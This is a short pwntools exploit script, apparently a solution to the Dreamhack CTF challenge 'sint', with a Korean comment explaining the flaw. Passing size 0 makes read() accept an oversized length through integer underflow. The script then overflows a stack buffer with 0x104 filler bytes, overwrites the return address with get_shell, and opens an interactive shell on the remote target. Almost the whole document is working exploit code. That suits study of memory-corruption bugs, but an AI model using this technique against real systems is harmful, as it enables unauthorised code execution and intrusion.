'''
[Dreamhack] sint
1. 취약점: read() 함수의 세 번째 인자(size_t 형)에 검증이 없어 정수 언더플로우(interger underflow) 발생
2. 시나리오: 입력 크기를 0xFF...FF로 크게 받아 buf에서 SFP까지 더미로 채우고 RET를 get_shell로 덮어씀
3. 페이로드 구조: [Dummy (buf + sfp)] + [get_shell 주소]
'''

from pwn import *

p = remote('IP', PORT)
e = ELF('./sint')

get_shell = e.symbols['get_shell']

p.sendlineafter(b'Size: ', b'0')

payload = b'\xFF' * 0x104 + p32(get_shell)

p.sendlineafter(b'Data: ', payload)

p.interactive()